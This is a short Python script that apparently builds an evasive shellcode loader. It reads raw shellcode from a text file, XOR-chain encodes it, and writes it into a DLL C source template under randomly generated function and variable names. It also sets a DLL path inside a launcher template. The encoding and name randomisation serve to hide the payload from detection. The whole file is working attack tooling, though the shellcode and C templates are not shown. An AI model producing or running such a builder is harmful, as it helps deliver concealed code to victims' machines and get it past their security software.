import binascii
import string
import random

def random_string(length):
    letters = string.ascii_lowercase
    result = ''.join(random.choice(letters) for i in range(length))

    return result

def encode(code: bytearray) -> bytearray :
    encoded = bytearray([code.pop(0)])
    
    for i in range(0, len(code)):
        encoded.append(code[i] ^ encoded[i])

    return encoded


with open('launcher.c', 'r', encoding='utf-8') as file:
    launcher_data = file.readlines()

with open('dll.c', 'r', encoding='utf-8') as file:
    dll_data = file.readlines()

with open('shellcode.txt', 'r', encoding='utf-8') as file:
    shellcode_data = file.readlines()

shellcode_data = shellcode_data[1:]
shellcode = ''.join(shellcode_data)
shellcode = shellcode.replace('\n', '').replace('"', '').replace(';', '').replace('\\', '').replace('x', '')

encoded = encode(bytearray(binascii.a2b_hex(shellcode)))
encoded = "\\x"+"\\x".join(str(binascii.hexlify(encoded, '-'))[1:].replace("'", "").split('-'))

print("Enter the path to the where the DLL will be located (USE // INSTEAD OF /)")
path = input()
print()

function = random_string(10)
variable = random_string(10)

for i in range(0, len(launcher_data)):
    launcher_data[i] = launcher_data[i].replace("<PATH_TO_REPLACE>", "\""+path+"<NAME_TO_REPLACE>"+"\"")

for i in range(0, len(dll_data)):
    dll_data[i] = dll_data[i].replace("<NAME_TO_REPLACE>", variable)
    dll_data[i] = dll_data[i].replace("<FUNCTION_TO_REPLACE>", function)
    dll_data[i] = dll_data[i].replace("<CODE_TO_REPLACE>", "\""+encoded+"\"")

with open('tmp_dll.c', 'w', encoding='utf-8') as file:
    file.writelines(dll_data)

with open('tmp_launcher.c', 'w', encoding='utf-8') as file:
    file.writelines(launcher_data)
